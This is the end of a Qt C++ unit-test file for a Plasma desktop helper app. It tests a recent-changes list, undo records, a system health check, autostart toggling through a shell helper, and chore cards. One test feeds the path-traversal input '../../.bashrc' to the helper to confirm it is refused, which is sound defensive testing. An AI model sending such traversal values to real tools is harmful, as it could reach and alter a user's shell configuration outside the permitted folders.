        pointer.proposal.title = QStringLiteral("Use the Bibata pointer");
        pointer.proposal.undo = QStringLiteral("plasma-apply-cursortheme breeze_cursors");
        pointer.status = QStringLiteral("done");
        records.append(pointer);
        ChangeRunner::Record fans = pointer;
        fans.id = QStringLiteral("c0");
        fans.made = QDateTime(QDate(2026, 10, 8), QTime(20, 0));
        fans.proposal.title = QStringLiteral("Set the fans to Quiet");
        fans.status = QStringLiteral("undone");
        fans.undone = QDateTime(QDate(2026, 10, 9), QTime(9, 0));
        records.append(fans);
        ChangeRunner::Record old = pointer;
        old.id = QStringLiteral("c-old");
        old.made = QDateTime(QDate(2026, 9, 1), QTime(9, 0));
        records.append(old);

        const RecentChanges::Look look = RecentChanges::readLook(fixture(QStringLiteral("recent-look.txt")), records, Now);
        QMap<QString, RecentChanges::Item> byId;
        QStringList order;
        for (const RecentChanges::Item &item : look.items) {
            byId.insert(item.id, item);
            order.append(item.id);
        }
        QVERIFY(look.restorePoints);
        // Today first: the restart the update waits for, then the change made
        // from a card, then the rest, newest first.
        QCOMPARE(order.mid(0, 2), (QStringList{QStringLiteral("restart"), QStringLiteral("own-c1")}));
        QCOMPARE(byId.value(QStringLiteral("own-c1")).action, QStringLiteral("undo"));
        QCOMPARE(byId.value(QStringLiteral("own-c1")).change, QStringLiteral("c1"));
        // Put back already: nothing to undo.
        QCOMPARE(byId.value(QStringLiteral("own-c0")).action, QString());
        QVERIFY(byId.value(QStringLiteral("own-c0")).detail.startsWith(QLatin1String("Put back")));
        // Older than two weeks is left out.
        QVERIFY(!byId.contains(QStringLiteral("own-c-old")));
        QVERIFY(!byId.contains(QStringLiteral("update-2026-09-20")));

        const RecentChanges::Item update = byId.value(QStringLiteral("update-2026-10-08"));
        QCOMPARE(update.title, QStringLiteral("5 parts of the system updated"));
        QVERIFY2(update.detail.contains(QLatin1String("the Plasma desktop 6.7.4")), qPrintable(update.detail));
        QVERIFY(update.detail.contains(QLatin1String("the Linux kernel 6.17.2")));
        QVERIFY(update.detail.contains(QLatin1String("the graphics drivers")));
        QCOMPARE(update.action, QStringLiteral("restore"));
        QVERIFY(update.question.contains(QLatin1String("parts of the system yesterday, including")));
        QCOMPARE(byId.value(QStringLiteral("update-2026-10-01")).detail, QStringLiteral("Nothing a person would notice by name"));

        // Only what the person installed is named.
        QCOMPARE(byId.value(QStringLiteral("install-2026-10-09")).title, QStringLiteral("Installed vlc"));
        QCOMPARE(byId.value(QStringLiteral("install-2026-10-09")).detail, QStringLiteral("With 1 part it needs"));
        QCOMPARE(byId.value(QStringLiteral("remove-2026-10-09")).title, QStringLiteral("Removed okular"));

        // Flathub apps, without the parts that come with them.
        QCOMPARE(byId.value(QStringLiteral("apps-2026-10-09")).detail, QStringLiteral("Updated Firefox"));
        QCOMPARE(byId.value(QStringLiteral("apps-2026-10-07")).detail, QStringLiteral("Installed Spotify"));

        // Settings by what they hold; a file a person wouldn't know is left out.
        QCOMPARE(byId.value(QStringLiteral("settings-2026-10-09")).detail,
                 QStringLiteral("Look, colours and fonts · Windows and effects"));
        QCOMPARE(byId.value(QStringLiteral("settings-2026-10-08")).detail,
                 QStringLiteral("Displays · Mouse, touchpad and pointer"));

        QCOMPARE(byId.value(QStringLiteral("service-bluetooth.service")).title, QStringLiteral("Stopped working: Bluetooth service"));
        QVERIFY(byId.value(QStringLiteral("service-syncthing.service")).detail.contains(QLatin1String("of yours")));
        QCOMPARE(byId.value(QStringLiteral("restart")).action, QStringLiteral("restart"));

        // Without restore points, going back is asked about.
        QString none = fixture(QStringLiteral("recent-look.txt"));
        none.replace(QStringLiteral("@@ snapper\nyes\n"), QStringLiteral("@@ snapper\n"));
        const RecentChanges::Look without = RecentChanges::readLook(none, {}, Now);
        for (const RecentChanges::Item &item : without.items) {
            if (item.kind == QLatin1String("update"))
                QCOMPARE(item.action, QStringLiteral("ask"));
        }
        // Nothing at all: nothing to show.
        QVERIFY(RecentChanges::readLook(QStringLiteral("@@ kernel\n6.1\npresent\n@@ end\n"), {}, Now).items.isEmpty());
    }

    void whatChangedOpensByNameAndUndoesFromTheCard()
    {
        RecentChanges recent;
        recent.setLookScript(printing(QStringLiteral("recent-look.txt")));
        QList<ChangeRunner::Record> records;
        ChangeRunner::Record pointer;
        pointer.id = QStringLiteral("c1");
        pointer.made = QDateTime::currentDateTime();
        pointer.proposal.title = QStringLiteral("Use the Bibata pointer");
        pointer.proposal.undo = QStringLiteral("plasma-apply-cursortheme breeze_cursors");
        pointer.status = QStringLiteral("done");
        records.append(pointer);
        recent.setRecords([&records] { return records; });
        recent.check();
        QCOMPARE(recent.stage(), QStringLiteral("looking"));
        QTRY_COMPARE(recent.stage(), QStringLiteral("ready"));
        QCOMPARE(recent.latestMap().value(QStringLiteral("change")).toString(), QStringLiteral("c1"));
        QVERIFY(recent.question().contains(QLatin1String("Use the Bibata pointer")));
        // Once undone, it has nothing more to undo, without looking again.
        records.first().status = QStringLiteral("undone");
        records.first().undone = QDateTime::currentDateTime();
        recent.refreshOwn();
        QVERIFY(recent.latestMap().isEmpty());
    }

    void theHealthCheckSeesRestartsPackagesAndDownloads()
    {
        const QString look = fixture(QStringLiteral("health-look.txt")).replace(
            QStringLiteral("@@ end"),
            QStringLiteral("@@ kernel\n6.17.1-2-cachyos\nmissing\n@@ packages\nerror: missing 'libfoo' dependency for 'bar'\n"
                           "@@ lock\n@@ downloads\n900000000\n400000000\n@@ end"));
        QMap<QString, HealthCheck::Item> byId;
        for (const HealthCheck::Item &i : HealthCheck::readLook(look, Now))
            byId.insert(i.id, i);
        QCOMPARE(byId.value(QStringLiteral("restart")).action, QStringLiteral("restart"));
        QCOMPARE(HealthCheck::tile(byId.value(QStringLiteral("restart"))), QStringLiteral("Restart to finish the update"));
        QCOMPARE(byId.value(QStringLiteral("packages")).state, QStringLiteral("bad"));
        QVERIFY(byId.value(QStringLiteral("packages")).question.contains(QLatin1String("libfoo")));
        QCOMPARE(byId.value(QStringLiteral("downloads")).action, QStringLiteral("downloads"));
        QVERIFY(byId.value(QStringLiteral("downloads")).detail.startsWith(QLatin1String("2 files")));

        // An install cut off is said before anything about the list.
        QString stuck = look;
        stuck.replace(QStringLiteral("@@ lock\n"), QStringLiteral("@@ lock\nstuck\n"));
        for (const HealthCheck::Item &i : HealthCheck::readLook(stuck, Now)) {
            if (i.id == QLatin1String("packages"))
                QCOMPARE(HealthCheck::tile(i), QStringLiteral("An update was cut off"));
        }
        // Nothing found, nothing said.
        for (const HealthCheck::Item &i : HealthCheck::readLook(fixture(QStringLiteral("health-look.txt")), Now))
            QVERIFY(i.id != QLatin1String("restart") && i.id != QLatin1String("packages") && i.id != QLatin1String("downloads"));
    }

    // The startup skill's helper, in the test's own home: an app is hidden for
    // this person only, and turned back on exactly as it was.
    void aStartupAppTurnsOffAndBackOn()
    {
        QTemporaryDir home;
        QTemporaryDir system;
        QVERIFY(write(system.filePath(QStringLiteral("autostart/sys.desktop")),
                      QStringLiteral("[Desktop Entry]\nName=Sys\nExec=sys\n")));
        const QString mine = home.filePath(QStringLiteral(".config/autostart/mine.desktop"));
        const QString original = QStringLiteral("[Desktop Entry]\nName=Mine\nExec=mine\n");
        QVERIFY(write(mine, original));
        const auto helper = [&](const QStringList &arguments, int *exitCode = nullptr) {
            QProcess p;
            QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
            env.insert(QStringLiteral("HOME"), home.path());
            env.remove(QStringLiteral("XDG_CONFIG_HOME"));
            env.insert(QStringLiteral("XDG_CONFIG_DIRS"), system.path());
            p.setProcessEnvironment(env);
            p.start(QStringLiteral("sh"), QStringList{QStringLiteral(PROJECT_DIR "/skills/plasma/startup-app.sh")} + arguments);
            p.waitForFinished(10000);
            if (exitCode)
                *exitCode = p.exitCode();
            return QString::fromUtf8(p.readAllStandardOutput()).trimmed();
        };
        const QString hid = home.filePath(QStringLiteral(".config/autostart/sys.desktop"));
        QCOMPARE(helper({QStringLiteral("state"), QStringLiteral("sys")}), QStringLiteral("on"));
        int code = -1;
        helper({QStringLiteral("off"), QStringLiteral("sys")}, &code);
        QCOMPARE(code, 0);
        QVERIFY(QFile::exists(hid));
        QCOMPARE(helper({QStringLiteral("state"), QStringLiteral("sys")}), QStringLiteral("off"));
        helper({QStringLiteral("on"), QStringLiteral("sys")}, &code);
        QCOMPARE(code, 0);
        QVERIFY(!QFile::exists(hid));

        helper({QStringLiteral("off"), QStringLiteral("mine")}, &code);
        QCOMPARE(code, 0);
        QCOMPARE(helper({QStringLiteral("state"), QStringLiteral("mine")}), QStringLiteral("off"));
        helper({QStringLiteral("on"), QStringLiteral("mine")}, &code);
        QFile file(mine);
        QVERIFY(file.open(QIODevice::ReadOnly));
        QCOMPARE(QString::fromUtf8(file.readAll()), original);

        // Nothing outside the autostart folders is reached.
        helper({QStringLiteral("off"), QStringLiteral("../../.bashrc")}, &code);
        QCOMPARE(code, 2);
        helper({QStringLiteral("off"), QStringLiteral("nothing")}, &code);
        QCOMPARE(code, 1);
    }

    void aCardIsOpenedByName()
    {
        QString error;
        std::optional<ChangeProposal> asked = ChangeProposal::fromJson(R"({"title": "Free up space", "card": "space"})", &error);
        QVERIFY2(asked, qPrintable(error));
        QCOMPARE(asked->card, QStringLiteral("space"));
        QVERIFY(!ChangeProposal::fromJson(R"({"title": "x", "card": "dishes"})"));

        Conversation c({});
        c.spaceCleanup()->setLookScript(printing(QStringLiteral("space-look.txt")));
        c.healthCheck()->setLookScript(printing(QStringLiteral("health-look.txt")));
        c.propose(*asked);
        QCOMPARE(c.chore(), QStringLiteral("space"));
        QVERIFY(c.choreBusy());
        // Never two at once.
        QVERIFY(!c.openChore(QStringLiteral("health")));
        QTRY_COMPARE(c.spaceCleanup()->stage(), QStringLiteral("ready"));
        QVERIFY(c.openChore(QStringLiteral("health")));
        QCOMPARE(c.chore(), QStringLiteral("health"));
        QCOMPARE(c.spaceCleanup()->stage(), QString());
        QTRY_COMPARE(c.healthCheck()->stage(), QStringLiteral("done"));
    }
};

QTEST_MAIN(TestChores)
#include "test_chores.moc"
